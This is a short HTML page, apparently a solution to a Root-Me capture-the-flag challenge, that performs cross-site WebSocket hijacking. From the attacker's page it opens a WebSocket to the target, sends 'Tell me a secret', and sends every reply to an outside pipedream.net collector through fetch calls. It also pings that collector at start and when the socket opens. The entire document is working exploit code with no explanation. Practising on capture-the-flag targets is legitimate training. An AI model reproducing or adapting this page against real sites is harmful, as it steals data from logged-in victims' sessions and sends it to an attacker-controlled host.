<!DOCTYPE html>
<html>
<body>
  <iframe src="http://ctf20.root-me.org/room"></iframe>
  <script>
    fetch('http://eo1gpdjxqwwogrz.m.pipedream.net/start');
    
    const ws = new WebSocket('ws://ctf20.root-me.org/ws');

    ws.addEventListener('open', () => {
      ws.send("Tell me a secret");
       fetch('http://eo1gpdjxqwwogrz.m.pipedream.net/ws-opened');
    });

    ws.addEventListener('message', (event) => {
      fetch('http://eo1gpdjxqwwogrz.m.pipedream.net/leak?' + encodeURIComponent(event.data));
    });
  </script>
</body>
</html>
